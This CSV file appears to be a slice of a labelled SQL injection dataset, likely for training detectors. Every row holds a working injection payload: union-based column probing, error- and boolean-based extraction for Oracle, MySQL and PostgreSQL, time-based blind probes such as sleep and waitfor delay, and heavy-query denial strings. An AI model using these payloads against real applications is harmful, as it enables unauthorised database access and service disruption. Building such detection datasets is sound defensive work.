row_index,payload_norm,label,sqli_type_hint
8910,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'quqx' = 'quqx",1,
8911,1' ) ) as kgfp where 2366 = 2366,1,
8912,"-3952' ) union all select 6644,6644,6644--",1,
8913,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'khah' like 'khah",1,
8914,"1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'lokx' like 'lokx",1,
8915,-2679' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'cutk' like 'cutk,1,
8916,"-5845' ) ) ) union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",1,
8917,"-5857%"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,1,
8918,"1"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""fvrq"" = ""fvrq",1,
8919,"-3316%"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""%"" = """,1,
8920,"1' ) ) as clhk where 4607 = 4607 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,
8921,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) +'",1,
8922,-3304' ) ) order by 1--,1,
8923,"1 ) as jvuo where 6859 = 6859 union all select null,null,null,null,null,null,null#",1,
8924,1 ) where 5651 = 5651,1,
8925,"1%"" or sleep ( 5 ) #",1,
8926,1 ) ) as ctqr where 2609 = 2609,1,
8927,1 ) where 4866 = 4866,1,
8928,"1'+ ( select 'zxxh' where 4065 = 4065 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
8929,"1"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""svse"" = ""svse",1,
8930,"1' ) where 5276 = 5276 union all select null,null--",1,
8931,1 ) ) ) or sleep ( 5 ) and ( ( ( 2209 = 2209,1,
8932,"1' ) as zxho where 5907 = 5907 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
8933,"1%"" ) or sleep ( 5 ) #",1,
8934,"1' ) where 8348 = 8348 and elt ( 4249 = 4249,7259 ) --",1,
8935,1 waitfor delay '0:0:5'--,1,
8936,"1'|| ( select 'aair' where 9234 = 9234 union all select null,null,null,null#",1,
8937,"-4165"" where 1772 = 1772 union all select 1772,1772,1772,1772,1772,1772,1772,1772--",1,
8938,"1%"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""%"" = """,1,
8939,"-8521' ) union all select 2446,2446,2446,2446,2446,2446,2446#",1,
